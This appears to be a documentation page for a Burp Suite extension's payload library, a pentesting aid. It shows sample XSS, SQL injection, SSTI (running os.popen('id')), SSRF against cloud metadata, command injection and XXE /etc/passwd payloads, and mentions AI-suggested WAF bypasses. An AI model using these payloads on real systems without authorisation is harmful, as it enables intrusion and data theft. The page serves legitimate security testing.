---
layout: default
title: Payload Library
parent: Features
nav_order: 3
---

# Payload Library
{: .no_toc }

80+ pre-built payloads across 8 categories with AI-powered suggestions.
{: .fs-6 .fw-300 }

<details open markdown="block">
  <summary>Table of contents</summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

---

## Overview

The Payload Library provides a comprehensive collection of security testing payloads, organized by vulnerability category. Payloads are sourced from real-world testing, PortSwigger methodologies, and the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) project.

---

## Built-in Payload Categories

### XSS — Reflected (15+ payloads)

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(document.domain)</script>
javascript:alert(1)
<details open ontoggle=alert(1)>
```

Includes: basic injection, event handlers, encoding bypasses, polyglot payloads, DOM-based vectors.

### XSS — Stored (10+ payloads)

Persistent XSS payloads designed for input fields that store and display data (profiles, comments, messages).

### SQL Injection — Error Based (15+ payloads)

```
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

Covers: MySQL, PostgreSQL, MSSQL, and Oracle databases.

### SQL Injection — Blind (10+ payloads)

Boolean-based and time-based blind SQL injection techniques.

### SSTI (10+ payloads)

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Covers: Jinja2, Twig, Freemarker, Velocity, ERB, Smarty.

### SSRF (10+ payloads)

```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]
http://2130706433
```

Covers: localhost bypass, cloud metadata (AWS/GCP/Azure), IP obfuscation.

### Command Injection (10+ payloads)

```
; id
| id
$(id)
`id`
%0aid
```

Covers: Linux and Windows command injection with filter bypasses.

### XXE (5+ payloads)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

Covers: file read, SSRF via XXE, blind XXE with OOB.

---

## Using Payloads

### Browse & Copy

1. Go to the **Payload Library** tab
2. Select a category from the sidebar
3. Click any payload to copy it to clipboard
4. Paste into Burp Repeater, Intruder, or manual testing

### AI-Powered Suggestions

When using the AI Advisor, VISTA automatically suggests relevant payloads based on:

- The vulnerability type being tested
- The detected WAF (bypass-specific payloads)
- The technology stack (PHP vs Java vs Node.js payloads)
- Previous conversation context

### Search & Filter

- Use the search bar to find payloads containing specific keywords
- Filter by category, severity, or tag
- Payloads show metadata including description and source

---

## Custom Payloads

### Creating Custom Libraries

1. Click **"New Library"** in the Payload Library tab
2. Give it a name and category
3. Add payloads one at a time or use bulk import

### Bulk Import

Import payloads from text files (one payload per line):

1. Click **"Import"**
2. Select a text file containing payloads
3. VISTA auto-detects the format and imports all payloads
4. Review and categorize imported payloads

### Export & Share

Export your custom payload libraries to share with your team:

1. Select a library
2. Click **"Export"**
3. Share the exported file with teammates
4. They can import it into their VISTA installation

---

## Payload Sources

VISTA's built-in payloads are curated from:

- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** — Community-maintained payload repository
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** — Research-backed techniques
- **[OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)** — Standard testing methodologies
- **Real-world bug bounty reports** — Proven payloads from disclosed vulnerabilities
